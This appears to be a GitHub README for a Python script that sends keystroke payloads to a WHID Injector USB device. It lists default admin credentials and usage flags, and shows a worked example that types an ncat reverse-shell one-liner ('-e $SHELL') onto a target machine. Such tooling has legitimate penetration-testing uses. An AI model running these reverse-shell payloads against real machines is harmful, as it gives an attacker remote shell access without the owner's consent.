# WHID Injector
**Disclaimer: Little project to interact with the WHID, mostly because I didn't wanted to modify the firmware to support my keyboard, feel free to improve it ;)**

What is it ? It's a simple script to send commands (french keyboard) from your terminal to the WHID Injector. It will automatically convert the "azerty" to "qwerty" format. Furthermore it has builtins payload such as reverse-shell and bind-shell.

Where to buy a WHID Injector ? I got mine from [Aliexpress](https://www.aliexpress.com/item/Cactus-Micro-compatible-board-plus-WIFI-chip-esp8266-for-atmega32u4/32318391529.html)

## How to start
Connect to the Access Point with the SSID "**Exploit**" with a password of "**DotAgency**".   
Open a web browser pointed to "**http://192.168.1.1**"    
The default administration username is "**admin**" and password "**hacktheplanet**".       
Remember to upgrade the firmware you will find the version 2.7 in this repository    
More info on the official Github : https://github.com/whid-injector/WHID

## How to use the script
```python
python3 WHIDInjector.py -v --host 127.0.0.1 --port 4242 --payload payloads/windows.txt -a -h                                                                          127 ↵
usage: WHIDInjector.py [-h] [-v] [--host [HOST]] [--port [PORT]]
                       [--user [USER]] [--pass [PASS]] [--panel [PANEL]]
                       [--payload [PAYLOAD]]

optional arguments:
  -h, --help           show this help message and exit
  -v                   Verbosity of the output
  --host [HOST]        Host reverse-shell
  --port [PORT]        Port reverse-shell
  --user [USER]        Wifi Panel username
  --pass [PASS]        Wifi Panel password
  --panel [PANEL]      Wifi Panel password
  --payload [PAYLOAD]  Payload template
```

Targeting a Windows OS
```
python3 WHIDInjector.py -v --host 127.0.0.1 --port 4242 --payload payloads/windows.txt
```

Send a simple reverse-shell payload
```python
$ python3 WHIDInjector.py -v --host 127.0.0.1 --port 4444                                                                                                                 1 ↵

     -------------------------------------------------------------
      WHID injector - You need to be connected to the Exploit AP
     -------------------------------------------------------------
                   __   °
                 <(o )___
                  ( ._> /
                   `---'                      @pentest_swissky

Enter a payload, eg: bash -c 'nohup ncat 127.0.0.1 4242 -e $SHELL &'
-------------------------------------------------------------------
>>> reverse
Payload:
Rem:Default Payload
Press:130+195
CustomDelay:1000
Print:bqsh 6c 4nohup ncqt !@&<)<)<! $$$$ 6e ]SHELL 14
CustomDelay:1000
Press:176

Sending payload to http://192.168.1.1/runlivepayload
```



# What's next  ?
TODO change_ssid_name    
TODO change_ssid_pass    
TODO update_firmware     
